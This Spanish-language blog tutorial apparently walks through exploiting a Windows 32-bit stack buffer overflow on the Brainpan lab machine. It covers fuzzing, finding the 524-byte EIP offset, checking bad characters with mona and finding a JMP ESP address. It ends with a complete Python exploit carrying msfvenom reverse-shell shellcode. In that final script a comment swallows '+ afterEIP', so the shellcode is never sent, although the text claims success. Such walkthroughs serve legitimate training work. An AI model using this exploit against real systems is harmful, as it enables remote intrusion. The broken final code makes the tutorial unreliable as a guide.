---
title: Buffer Overflow Windows x32
author: thespartoos
date: 2025-01-07 00:34:00 +0800
tags: [Binary Exploitation]
categories: [Buffer Overflow x32]
image:
  path: https://thespartoos.github.io/assets/img/favicons/BOFWindows/portada.png
  alt:
---


### Plan de investigación


Situémonos en el escenario de una máquina Windows de 32 bits en donde este ejecutando un binario el cual exponga un servicio vulnerable en la red. En este caso vamos a estar explicando esta técnica de explotación a través de la máquina Brainpan localizada tanto en [**TryHackme**](https://tryhackme.com/) como en [**Vulnhub**](https://www.vulnhub.com/).


Para este tipo de ataque será necesario de alguna manera obtener el PE ejecutable de Windows para poder analizarlo y en el caso explotar esta vulnerabilidad.


### Creación del entorno


Antes que nada deberemos de tener un entorno adecuado para explotar esta vulnerabilidad. Necesitaremos tener una máquina Windows preferiblemente elegir la versión del SO igual que al que vamos a atacar, quiero decir si el servicio de la máquina objetivo es un Windows 7 de x32, nosotros deberemos de elegir una máquina Windows 7 de x32 para poder realizar las pruebas y ver si lo podemos explotar antes de manera local y posteriormente realizarlo para la máquina objetivo para que no hayan fallos en la máquina objetivo. Para ello podemos utilizar las siguientes herramientas.


<div style="display: flex; justify-content: center; align-items: center; height: 10vh;">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/windows.png" alt="" width="100" height="100">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/vmware.png" alt="" width="60" height="60">
</div><br>

Una vez lo tenemos en red deberemos de tener desactivado el firewall o configurar una regla para poder exponer el puerto que expone localmente el binario y aceptar conexiones desde otros equipos al servicio de nuestro binario. Ajustar tanto una Regla de entrada como una de salida.


![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/firewall.png)

Por último en caso para poder explotar esta vulnerabilidad deberemos de desactivar el DEP.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/desactivar.png)


### Análisis del binario

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/brainpan.png)


Cuando ya tenemos conectividad con nuestra máquina local y ejecutamos el binario desde nuestra máquina de atacante (kali) vamos a enumerar el puerto de nuestra máquina local para ver que hay conectividad y se está ejecutando bien el binario.


```bash
nmap -p 9999 --open -vvv -Pn -n 192.168.1.X
```


Con este comando podemos ver si el puerto del servicio que ofrece el binario está expuesto. Para ver que tenemos conectividad ejecutamos el siguiente comando.


```bash
nc 192.168.1.X 9999
```

Antes que nada vamos a ver como funciona el programa el cual vamos analizar. Podemos observar que hay un campo en donde nos piden la contraseña, podemos probar a fuzzear ese campo para ver si es vulnerable, para ello lanzaremos una gran cantidad de datos para ver como lo maneja la aplicación.

<div style="display: flex; justify-content: center; align-items: center; height: 35vh;">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/break.png" alt="" width="500" height="500">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/fuzz.png" alt="" width="500" height="500">
</div>

Como podemos ver en las imagenes anteriores el programa esta copiando el buffer que nosotros le mandamos a otra variable la cual podemos intuir que función vulnerable puede ser &nbsp;`strcpy`&nbsp;.

> Cuando se realiza este tipo de procedimientos deberemos de reiniciar la aplicacion porque el servicio ha sido interrumpido y ha crasheado.
{: .prompt-warning }

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/strings.png)

Una vez comprobado que es vulnerable a este ataque vamos a proceder a explotar la vulnerabilidad para que nos de una reverse shell o ejecutar cualquier otro conjunto de instrucciones. Para ello deberemos de instalar en la máquina local de Windows 7 la herramienta de **Inmmunity debugger**, hay muchas otras más.

Debemos de descargarnos un archivo de python que deberemos de añadirlo a nuestra aplicación de Inmmunity debugger.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/mona.png)

Este programa sirve para analizar el flujo del programa después de exceder el buffer. Lo primero que tenemos que hacer es atachearnos al proceso de la aplicación vulnerable.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/attach.png)

`File - attach`

Una vez seleccionado el proceso debemos de arrancarlo dado que el programa lo para al realizar el attach.

Ahora podremos realizar el exceso del buffer para calcular cuantos bytes necesitamos para manejar el EIP para posteriormente ejecutar shellcode en la pila **(ESP)**.

El primer paso es identificar la cantidad de bytes exacta para provocar un buffer overflow y conocer con cuantos bytes controlamos el EIP. Para lo haremos de una manera sencilla utilizando la herramienta de metasploit llamada &nbsp;`pattern_create.rb`&nbsp;. 

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/patron.png)

Lo que hacemos con esta herramientas es generar un patron que lanzaremos sobre el campo vulnerable, donde ponemos la contraseña. Cuando enviemos la data nos fijaremos en el Immunity debugger que dirección tiene EIP para a través de la otra utilidad de metasploit &nbsp;`pattern_offset.rb`&nbsp; saber cuantos bytes corresponden para llegar al EIP.

<div style="display: flex; justify-content: center; align-items: center; height: 35vh;">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/eip_pattern.png" alt="" width="500" height="500">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/offset.png" alt="" width="500" height="500">
</div>

La dirección de EIP en este caso es &nbsp;`0x35724134`&nbsp;. Como vemos al sacar el offset nos da un total de 524 caracteres. Para comprobarlo deberemos de generar nuestro patrón sencillo para identificar que exactamente son 524 bytes para llegar a EIP.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/test.png)

Una vez generado lo volvemos a lanzar contra el servicio sobre el campo vulnerable y vemos como se comporta.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/flujo_test.png)

La dirección de EIP vale &nbsp;`0x42424242`&nbsp; lo cual equivale a las letras "B" en hexadecimal por lo tanto las 524 primeros bytes son el offset y los 4 bytes siguientes son los que se quedaran en el registro de EIP, el resto de bytes que enviamos, las letras "C", podemos ver que están en el ESP. Lo siguiente que deberemos de hacer será encontrar que tipos de badchars no se interpretarían en el ESP dado que en el caso de que hubiera badchars los tendríamos que quitar de nuestro shellcode porque sino no funcionaría la instrucción que le indiquemos.

> El ESP será el registro en donde deberemos de arrojar nuestro shellcode para que lo interprete y lo ejecute.
{: .prompt-info }

Lo primero para más comodidad dentro del programa crearemos una carpeta de trabajo.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/workingFolder.png)

Una vez creada generaremos una serie de bytes para lanzarlo en el campo vulnerable y ver que bytes es capaz el ESP de interpretar y cuales son badchars. Por defecto es buenar práctica eliminar el byte &nbsp;`0x00`&nbsp; ya que suele ser uno de los más comunes entre el &nbsp;`0x0a 0x0d`&nbsp;.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/bytearray.png)

Una vez tengamos la serie de bytes que nos lo crea en la carpeta de trabajo llamado como **bytearray** deberemos de pasarlo a nuestra máquina de atacante para crearnos un script en python sencillo para automatizarnos y que sea más rápido la carga de los bytes.

```python
#!/usr/bin/python3

import socket

from struct import pack

offset = 524
beforeEIP = b"A"* offset
eip = b"B"*4 # JMP ESP

afterEIP = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = beforeEIP + eip + afterEIP

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.152", 9999))
s.send(payload)
s.close()
```

Como vemos el offset que es lo que va antes del EIP sería lo que hemos calculado antes los 524 bytes, posteriormente indicamos en el valor de EIP y posteriormente lo que estará en el ESP que será nuestro bytearray generado, posteriormente se conectara al servicio y enviará la data.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/badchars.png)


Si nos fijamos en la imagen abajo a la izquierda veremos los bytes **01 02 03...**, esos corresponde a lo que le estamos enviando &nbsp;`\x01\x02\0x03`&nbsp; como para el resto lo mismo. En el caso de que uno no apareciera en ese apartado (flujo de ESP), es que sería un badchar. Para automatizar esto y no hacerlo viendolo a ojo podemos utilizar la herramienta de mona.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/compare.png)


Lo que esta haciendo es ver que si el contenido que generamos del bytearray coincide con los datos que hay en la direccion de la memoria del ESP.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/nobadchars.png)

En este caso no hay mas badchars por lo tanto podemos generar ya nuestro shellcode sabiendo que podemos utilizar todos los bytes menos el &nbsp;`0x00`&nbsp;. Pero para completar más esta guía en el caso de que hubiera habido más badchars nos habría salido una ventana como esta.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/casoBadchars.png)

Por lo tanto deberíamos de generar otro bytearray quitando **00 0a y 0d** con los mismo pasos que antes y repetir lo mismo hasta encontrar que no hay más badchars.

Continuando con el desarrollo del exploit necesitamos que EIP apunte a una dirección que actúe como un salto al ESP para que vaya directamente al ESP y ejecute nuestro shellcode. Deberemos de saber que instrucción en ensamblador corresponde a un salto al ESP, utilizaremos la herramienta de metasploit llamada &nbsp;`nasm_shell.rb`&nbsp;.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/nasm.png)

Vemos que las instrucciones son &nbsp;`\xFF\xE4`&nbsp;. Para ello deberemos de ver las protecciones que tiene el binario antes que nada y localizar un modulo que tenga todas las protecciones en **False**.

```
!mona modules
```

Eso sería para ver los módulos existentes junto con sus protecciones. al localizar un módulo sin ninguna protección buscamos dentro la instrucción que vimos antes y lo hacemos de la siguiente manera.

<div style="display: flex; justify-content: center; align-items: center; height: 35vh;">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/modules.png" alt="" width="500" height="500">
    <img src="https://thespartoos.github.io/assets/img/favicons/BOFWindows/jump.png" alt="" width="500" height="500">
</div>

Para comprobarlo podemos ir a esa dirección de memoria que nos arroja que tiene permisos de &nbsp;`PAGE_EXECUTE_READ (RX)`&nbsp;, esto es importante ya que podemos ejecutar shellcode en el ESP teniendo ese tipo de protección.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/breakpoint.png)

En la dirección que obtuvimos del módulo vemos que se encuentra esa instrucción. Por lo tanto deberemos de modificar nuestro exploit para en vez de poner las letras **"B"** que poníamos antes para que EIP valiera eso, ahora debemos de indicar esta dirección de la memoria para que nos aplique el salto.

Después de modificar el valor del EIP por la dirección del &nbsp;`JMP ESP`&nbsp; es el paso de generar el shellcode descartanto los badchars que identificamos previamente.

![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/shellcode.png)

A través de la utilidad de **msfvenom** generamos un shellcode que nos de una reverse shell, importante indicar la plataforma para windows y la arquitectura x86 y los badchars. Una vez generado el shellcode vamos a adaptarlo a nuestro exploit y a completarlo, el resultado sería el siguiente. <br>
Al generar el shellcode lo hemos generado con un encoder polimórfico por lo tanto deberemos de darle un tiempo para que se descifre en la memoria por lo tanto podemos utilizar la técnica de añadir varios **NOP** (No operation code) al principio del ESP para que no haga nada durante un tiempo y le de tiempo a descifrarse y cuando llegue a las instrucciones del shellcode las lleve a cabo con éxito. 


```python
#!/usr/bin/python3

import socket

from struct import pack

offset = 524
beforeEIP = b"A"* offset
eip = pack("<I", 0x311712f3) # JMP ESP

afterEIP = (b"\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9\xba\x73\x92\x60\x6e"
b"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x25\x81\x82\x9b\x35"
b"\x4d\xc0\x64\xc5\x8e\xa5\xed\x20\xbf\xe5\x8a\x21\x90\xd5"
b"\xd9\x67\x1d\x9d\x8c\x93\x96\xd3\x18\x94\x1f\x59\x7f\x9b"
b"\xa0\xf2\x43\xba\x22\x09\x90\x1c\x1a\xc2\xe5\x5d\x5b\x3f"
b"\x07\x0f\x34\x4b\xba\xbf\x31\x01\x07\x34\x09\x87\x0f\xa9"
b"\xda\xa6\x3e\x7c\x50\xf1\xe0\x7f\xb5\x89\xa8\x67\xda\xb4"
b"\x63\x1c\x28\x42\x72\xf4\x60\xab\xd9\x39\x4d\x5e\x23\x7e"
b"\x6a\x81\x56\x76\x88\x3c\x61\x4d\xf2\x9a\xe4\x55\x54\x68"
b"\x5e\xb1\x64\xbd\x39\x32\x6a\x0a\x4d\x1c\x6f\x8d\x82\x17"
b"\x8b\x06\x25\xf7\x1d\x5c\x02\xd3\x46\x06\x2b\x42\x23\xe9"
b"\x54\x94\x8c\x56\xf1\xdf\x21\x82\x88\x82\x2d\x67\xa1\x3c"
b"\xae\xef\xb2\x4f\x9c\xb0\x68\xc7\xac\x39\xb7\x10\xd2\x13"
b"\x0f\x8e\x2d\x9c\x70\x87\xe9\xc8\x20\xbf\xd8\x70\xab\x3f"
b"\xe4\xa4\x7c\x6f\x4a\x17\x3d\xdf\x2a\xc7\xd5\x35\xa5\x38"
b"\xc5\x36\x6f\x51\x6c\xcd\xf8\x9e\xd9\xcc\x58\x76\x18\xce"
b"\x99\x3c\x95\x28\xf3\x52\xf0\xe3\x6c\xca\x59\x7f\x0c\x13"
b"\x74\xfa\x0e\x9f\x7b\xfb\xc1\x68\xf1\xef\xb6\x98\x4c\x4d"
b"\x10\xa6\x7a\xf9\xfe\x35\xe1\xf9\x89\x25\xbe\xae\xde\x98"
b"\xb7\x3a\xf3\x83\x61\x58\x0e\x55\x49\xd8\xd5\xa6\x54\xe1"
b"\x98\x93\x72\xf1\x64\x1b\x3f\xa5\x38\x4a\xe9\x13\xff\x24"
b"\x5b\xcd\xa9\x9b\x35\x99\x2c\xd0\x85\xdf\x30\x3d\x70\x3f"
b"\x80\xe8\xc5\x40\x2d\x7d\xc2\x39\x53\x1d\x2d\x90\xd7\x3d"
b"\xcc\x30\x22\xd6\x49\xd1\x8f\xbb\x69\x0c\xd3\xc5\xe9\xa4"
b"\xac\x31\xf1\xcd\xa9\x7e\xb5\x3e\xc0\xef\x50\x40\x77\x0f"
b"\x71")
payload = beforeEIP + eip + b"\x90"*16 # NOPS (No operation code) + afterEIP

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.152", 9999))
s.send(payload)
s.close()
```

Por último reiniciamos la aplicación vulnerable y ejecutamos el exploit.


![](https://thespartoos.github.io/assets/img/favicons/BOFWindows/exploit.png)


Como vemos ha sido explotado correctamente y tenemos una reverse shell interactiva. Espero que te haya servido este post !. 




